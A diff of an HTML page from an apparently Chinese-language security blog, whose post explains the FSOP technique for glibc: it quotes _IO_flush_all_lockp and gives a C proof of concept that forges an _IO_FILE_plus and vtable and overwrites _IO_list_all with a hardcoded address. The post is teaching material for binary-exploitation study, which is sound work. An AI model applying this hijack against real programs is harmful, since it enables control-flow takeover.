@@ -1,90 +1,158 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="author" content="Loora1N">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-    </a>
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【IO_FILE】FSOP | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-    
-        <div class="post-main-title">
-            【IO_FILE】FSOP
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
         </div>
-        <div class="post-meta">
-            2022-11-25
+        <div class="post-title">
+            
+            
+                【IO_FILE】FSOP
+            
+            
         </div>
-        <div class="post-md">
-            <blockquote>
+        <span class="post-date">
+            11月 25, 2022
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <blockquote>
 <p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。另外由于网络上很多IO_FILE相关博客含有相关glibc源代码，但是并没有源代码的完整部分或者链接。在之后的博客中，我会包含该段代码在哪里可以查看得到。</p>
 </blockquote>
 <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>
-<pre><code class="c">//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685
-int
-_IO_flush_all_lockp (int do_lock)
-&#123;
-  int result = 0;
-  FILE *fp;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-#ifdef _IO_MTSAFE_IO
-  _IO_cleanup_region_start_noarg (flush_cleanup);
-  _IO_lock_lock (list_all_lock);
-#endif
-
-  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)
-    &#123;
-      run_fp = fp;
-      if (do_lock)
-    _IO_flockfile (fp);
-
-      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
-       || (_IO_vtable_offset (fp) == 0
-           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
-                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
-       )
-      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
-    result = EOF;
-
-      if (do_lock)
-    _IO_funlockfile (fp);
-      run_fp = NULL;
-    &#125;
-
-#ifdef _IO_MTSAFE_IO
-  _IO_lock_unlock (list_all_lock);
-  _IO_cleanup_region_end (0);
-#endif
-
-  return result;
-&#125;
-</code></pre>
 <p><img src="/img/article/fsop/abort_routine.001.jpeg" alt="img"></p>
 <p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
 <ul>
@@ -95,14 +163,8 @@ _IO_flush_all_lockp (int do_lock)
 <h2 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h2><p>梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为<code>_IO_list_all </code>是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写<code>_IO_list_all</code>。</p>
 <p>之后需要用任意地址写把<code>_IO_list_all</code> 的内容改为指向我们可控内存的指针，</p>
 <p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p>
-<pre><code class="c">if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
-       || (_IO_vtable_offset (fp) == 0
-           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
-                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
-       )
-      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
-    result = EOF;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>
+
 <p>这里其实是两个条件二选一</p>
 <ol>
 <li>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt; _IO_write_ptr &gt; fp-&gt; _IO_write_base</li>
@@ -114,72 +176,104 @@ _IO_flush_all_lockp (int do_lock)
 <li>fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base</li>
 </ul>
 <p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和 _IO_FILE_plus。 为了绕过验证，我们提前获得了 _IO_write_ptr、 _IO_write_base、 _mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据</p>
-<pre><code>#define _IO_list_all 0x7ffff7dd2520
-#define mode_offset 0xc0
-#define writeptr_offset 0x28
-#define writebase_offset 0x20
-#define vtable_offset 0xd8
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_list_all 0x7ffff7dd2520</span><br><span class="line">#define mode_offset 0xc0</span><br><span class="line">#define writeptr_offset 0x28</span><br><span class="line">#define writebase_offset 0x20</span><br><span class="line">#define vtable_offset 0xd8</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr;</span><br><span class="line">    long long *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x200);</span><br><span class="line"></span><br><span class="line">    *(long long*)((long long)ptr+mode_offset)=0x0;</span><br><span class="line">    *(long long*)((long long)ptr+writeptr_offset)=0x1;</span><br><span class="line">    *(long long*)((long long)ptr+writebase_offset)=0x0;</span><br><span class="line">    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);</span><br><span class="line"></span><br><span class="line">    *(long long*)((long long)ptr+0x100+24)=0x41414141;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(long long *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[0]=ptr;</span><br><span class="line"></span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-int main(void)
-&#123;
-    void *ptr;
-    long long *list_all_ptr;
-
-    ptr=malloc(0x200);
-
-    *(long long*)((long long)ptr+mode_offset)=0x0;
-    *(long long*)((long long)ptr+writeptr_offset)=0x1;
-    *(long long*)((long long)ptr+writebase_offset)=0x0;
-    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);
-
-    *(long long*)((long long)ptr+0x100+24)=0x41414141;
-
-    list_all_ptr=(long long *)_IO_list_all;
-
-    list_all_ptr[0]=ptr;
-
-    exit(0);
-&#125;
-</code></pre>
 <p>我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的 _IO_overflow 指针。</p>
 <p>之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的 _IO_FILE_plus。</p>
 <p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush 获取 _IO_list_all 的值并取出作为 _IO_FILE_plus 调用其中的 _IO_overflow</p>
-<pre><code class="c">---&gt; call _IO_overflow
-[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)
-[#1] 0x7ffff7a8932a → Name: _IO_cleanup()
-[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)
-[#3] 0x7ffff7a47045 → Name: __GI_exit(status=&lt;optimized out&gt;)
-[#4] 0x4005ce → Name: main()
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---&gt; call _IO_overflow</span><br><span class="line">[#<span class="number">0</span>] <span class="number">0x7ffff7a89193</span> → Name: _IO_flush_all_lockp(do_lock=<span class="number">0x0</span>)</span><br><span class="line">[#<span class="number">1</span>] <span class="number">0x7ffff7a8932a</span> → Name: _IO_cleanup()</span><br><span class="line">[#<span class="number">2</span>] <span class="number">0x7ffff7a46f9b</span> → Name: __run_exit_handlers(status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=<span class="number">0x1</span>)</span><br><span class="line">[#<span class="number">3</span>] <span class="number">0x7ffff7a47045</span> → Name: __GI_exit(status=&lt;optimized out&gt;)</span><br><span class="line">[#<span class="number">4</span>] <span class="number">0x4005ce</span> → Name: main()</span><br></pre></td></tr></table></figure>
+</div> 
 
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/">Prev</a>
+                </div>
+            
         </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2022/11/13/%E3%80%90IO_FILE%E3%80%91house%20of%20cat/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
 
+    
+      <div class="post-comment">
+
+     
+
+     
+    
     
 
 </div>
-                <div class="footer">
-    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
 </div>
 
+    </div>
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
             </div>
         </div>
-    <!-- hexo injector body_end start -->
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
